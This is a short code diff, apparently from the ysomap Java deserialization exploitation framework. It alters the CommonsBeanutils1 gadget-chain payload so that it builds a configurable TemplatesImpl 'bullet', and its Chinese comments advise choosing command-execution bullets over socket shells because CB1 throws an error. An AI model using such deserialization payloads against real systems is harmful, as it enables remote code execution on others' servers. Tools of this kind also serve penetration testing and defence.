@@ -10,6 +10,10 @@ import ysomap.payloads.AbstractPayload;
 import java.util.PriorityQueue;
 
 /**
+ * cb1的反序列化会报错
+ * 所以在选用bullet的时候，尽量选取报错也不会影响执行效果的类型
+ * 比如直接执行命令
+ * 比如运行socket shell的bullet就不太适合了
  * @author wh1t3P1g
  * @since 2020/5/14
  */
@@ -23,7 +27,12 @@ public class CommonsBeanutils1 extends AbstractPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return new TemplatesImplBullet().set("body",args[0]);
+        Bullet bullet = new TemplatesImplBullet();
+        bullet.set("type", args[0]);
+        bullet.set("body", args[1]);
+        bullet.set("effect", args[2]);
+        bullet.set("exception", args[3]);
+        return bullet;
     }
 
     @Override
